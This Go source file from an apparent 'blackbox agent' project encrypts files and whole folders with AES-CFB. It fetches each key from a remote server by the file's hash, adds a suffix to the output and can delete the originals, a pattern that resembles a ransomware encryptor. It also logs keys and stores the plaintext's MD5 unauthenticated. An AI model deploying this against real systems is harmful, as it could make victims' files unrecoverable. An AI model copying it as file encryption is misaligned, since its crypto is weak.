package operation

import (
	"blackbox/agent/cli"
	"blackbox/agent/connect"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"io"
	"io/ioutil"
	"log"
	"os"
)

func AesEncryptFile(filedata []byte, hash [16]byte, key []byte, opath string) error {
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	cipherdata := make([]byte, md5.Size+aes.BlockSize+len(filedata))
	for i, c := range hash {
		cipherdata[i] = c
	}
	iv := cipherdata[md5.Size : md5.Size+aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(cipherdata[md5.Size+aes.BlockSize:], filedata)

	err = ioutil.WriteFile(opath, cipherdata, 0644)
	if err != nil {
		return err
	}
	return nil
}

func AesEncryptFileAuto(arg cli.Args, path string) error {
	filedata, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}
	hash := md5.Sum(filedata)
	log.Println("hash", hash)
	key, err := connect.RequestSecret(arg, hex.EncodeToString(hash[:]))
	if err != nil {
		return err
	}
	log.Println("key", key)
	opath := path + "." + arg.Suffix
	err = AesEncryptFile(filedata, hash, key, opath)
	if err != nil {
		return err
	}
	log.Println("Encrypted file saved to", opath)
	if arg.Remove {
		log.Println("Removing file:", path)
		err = os.Remove(path)
	}
	return err
}

func AesEncryptFolderAuto(arg cli.Args, path string) error {
	return folderOp(AesEncryptFileAuto, arg, path)
}
